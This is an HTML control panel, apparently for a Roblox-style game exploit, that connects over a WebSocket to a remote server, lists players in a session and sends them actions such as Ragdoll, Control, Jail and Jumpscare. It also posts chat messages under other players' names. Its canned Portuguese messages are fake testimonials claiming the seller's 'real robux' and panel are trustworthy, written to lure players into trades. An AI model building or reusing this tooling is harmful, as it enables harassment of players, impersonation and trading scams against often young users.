<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>pxl4r1z3d Panel</title>

<style>
body {
  margin:0;
  background:#f3f0ff;
  font-family:sans-serif;
  display:flex;
  justify-content:center;
  padding:20px;
}

.panel {
  width:400px;
  background:white;
  border-radius:14px;
  box-shadow:0 8px 25px rgba(100, 0, 255, 0.15);
  overflow:hidden;
}

.header {
  padding:12px;
  background:linear-gradient(90deg,#6a00ff,#9d4edd);
  color:white;
  display:flex;
  justify-content:space-between;
}

.section {
  padding:12px;
  border-bottom:1px solid #eee;
}

.title {
  font-size:12px;
  color:#666;
  margin-bottom:6px;
}

input {
  width:100%;
  padding:8px;
  margin-bottom:6px;
  border:1px solid #ddd;
  border-radius:8px;
  outline:none;
}

input:focus {
  border-color:#9d4edd;
}

.btn {
  background:linear-gradient(90deg,#6a00ff,#9d4edd);
  color:white;
  padding:8px;
  text-align:center;
  border-radius:8px;
  cursor:pointer;
  margin-top:5px;
  transition:0.15s;
}

.btn:hover {
  opacity:0.9;
}

.players {
  max-height:140px;
  overflow:auto;
}

.player {
  padding:6px;
  border-radius:8px;
  border:1px solid #eee;
  margin-bottom:4px;
  cursor:pointer;
  transition:0.1s;
}

.player:hover {
  background:#f0e9ff;
  border-color:#cdb4ff;
}

/* mensagens prontas */
.msgs {
  display:flex;
  flex-direction:column;
  gap:5px;
}

.msg {
  padding:6px;
  border-radius:8px;
  border:1px solid #ddd;
  cursor:pointer;
  font-size:12px;
  transition:0.1s;
}

.msg:hover {
  background:#f0e9ff;
  border-color:#cdb4ff;
}
</style>
</head>

<body>

<div class="panel">

<div class="header">
  <span>pxl4r1z3d Panel</span>
  <span id="status">OFF</span>
</div>

<div class="section">
  <div class="title">PLAYERS</div>
  <div id="players" class="players"></div>
  <div class="btn" onclick="refresh()">Refresh</div>
</div>

<div class="section">
  <div class="title">CHAT</div>

  <input id="name" placeholder="Player Name">
  <input id="msg" placeholder="Message">

  <div class="btn" onclick="sendChat()">Send</div>
</div>

<div class="section">
  <div class="title">QUICK MESSAGES</div>
  <div class="msgs" id="quickMsgs"></div>
</div>

<div class="section">
  <div class="title">ACTIONS</div>

  <div class="btn" onclick="send('Ragdoll')">Ragdoll</div>
  <div class="btn" onclick="send('Control')">Control</div>
  <div class="btn" onclick="send('Jail')">Jail</div>
  <div class="btn" onclick="send('Jumpscr')">Jumpscr</div>
  <div class="btn" onclick="send('Balloon')">Balloon</div>
  <div class="btn" onclick="send('Inverse')">Inverse</div>
  <div class="btn" onclick="send('Morph')">Morph</div>
</div>

</div>

<script>
let ws;

const playersBox = document.getElementById("players");
const statusEl = document.getElementById("status");
const quickBox = document.getElementById("quickMsgs");

// 🔥 MENSAGENS (ATUALIZADAS)
const messages = [
"Oloko Mn chegou Msm achei que era Faike",
"Muito Confiavel mn!!",
"Mn , ja que chegou Pss testa??",
"Obrigado rodrigues Te amo Mn Continue sendo confiavell",
"Pessoal chegou Msm! AChei que era fake , posso testar Mn?",
"Mdsssss recebi mesmooo , vou testar para o Pessoal da laive ver que nao e fake",
"Mn muito obrigado por nao me scammar ja fui Mt escamado",
"Meu deuss Mn vc realizou meus sonhooooo",
"Caraca mano e muito legal de usar Kakakakakakak",
"Mn Vc e o unico que tem robux real mnn",
"Mn Pss testa e kitar pra vc trocar com outras pessoas??",
"Podem trocar com ele pessoal! Ele e muito confiavel mesmo!!",
"Confiei e não me arrependi não!!! So troquem com ele!",
"Rapaziada pode ir sem medo, é real o painel!!",
"Slk chegou rapido demais nem acreditei",
"Oloko Mn chega na hora mesmo achei que demorava Kakakakaka",
"Mn ja que testei vou kitar blzz? Vlww Mn mto obrigado pelo painel!",
"O mais confiavel rpzd",
"recebi o painel aqui vlw irmao"

];

// render msgs
messages.forEach(m=>{
  const el = document.createElement("div");
  el.className = "msg";
  el.textContent = m;
  el.onclick = ()=> msgInput.value = m;
  quickBox.appendChild(el);
});

const msgInput = document.getElementById("msg");

// conexão
function connect(){
  ws = new WebSocket("wss://luarmor-ws.onrender.com/ws");

  ws.onopen = ()=>{
    statusEl.textContent = "ONLINE";

    ws.send(JSON.stringify({
      type:"register",
      client:"site"
    }));
  };

  ws.onclose = ()=>{
    statusEl.textContent = "OFF";
    setTimeout(connect,2000);
  };

  ws.onmessage = (e)=>{
    try{
      const data = JSON.parse(e.data);
      if(data.type === "players"){
        renderPlayers(data.list);
      }
    }catch{}
  };
}

function renderPlayers(list){
  playersBox.innerHTML = "";

  list.forEach(p=>{
    const el = document.createElement("div");
    el.className = "player";
    el.textContent = p;

    el.onclick = ()=>{
      document.getElementById("name").value = p;
      navigator.clipboard?.writeText(p);
    };

    playersBox.appendChild(el);
  });
}

function send(name){
  if(ws.readyState === 1){
    ws.send(JSON.stringify({button:name}));
  }
}

function sendChat(){
  const player = document.getElementById("name").value;
  const msg = document.getElementById("msg").value;

  if(!player || !msg) return;

  ws.send(JSON.stringify({
    type:"chat",
    player:player,
    message:msg,
    id: Date.now()+"_"+Math.random()
  }));
}

function refresh(){
  ws.send(JSON.stringify({type:"refresh"}));
}

connect();
</script>

</body>
</html>
